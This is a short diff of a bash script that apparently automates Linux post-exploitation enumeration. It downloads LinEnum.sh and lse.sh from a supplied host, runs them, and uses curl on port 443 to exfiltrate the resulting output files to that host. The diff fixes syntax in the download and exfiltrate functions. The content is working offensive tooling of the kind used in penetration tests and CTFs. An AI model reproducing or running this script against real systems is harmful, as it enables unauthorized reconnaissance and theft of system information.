@@ -30,8 +30,7 @@ fi
 prep()
 {
 	# Check first argument is supplied. Should be hostname/IP address
-	if [ -z "$ip" ]
-	then
+	if [ -z "$ip" ] ; then
 		echo "Host Required"
 		exit
 	fi
@@ -104,7 +103,6 @@ quick_enum()
 download()
 {
 	if [ $dload -eq "wget" ] ; then
-	do 
 		echo "\n#### Downloading LinEnum.sh ####\n"
 		$dload $1/LinEnum.sh
 	
@@ -119,7 +117,7 @@ download()
 	
 		echo "\n#### Downloading lse.sh ####\n"
 		$dload $1/lse.sh
-	done
+	fi
 }
 
 # Execute enum scripts
@@ -138,7 +136,6 @@ execute()
 exfiltrate()
 {
 	if [ $dload -eq "curl" ] ; then
-	do
 		files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt")
 	
 		for file in "${files[@]}"
@@ -146,7 +143,9 @@ exfiltrate()
 			echo "\n#### Exfiltrating: $file ####\n" 
 			curl -F "data=@$file" $1:443
 		done
-	done
+	else
+		echo "\n### Curl not found. Exfiltrate manually ###\n"
+	fi
 }
 
 run()
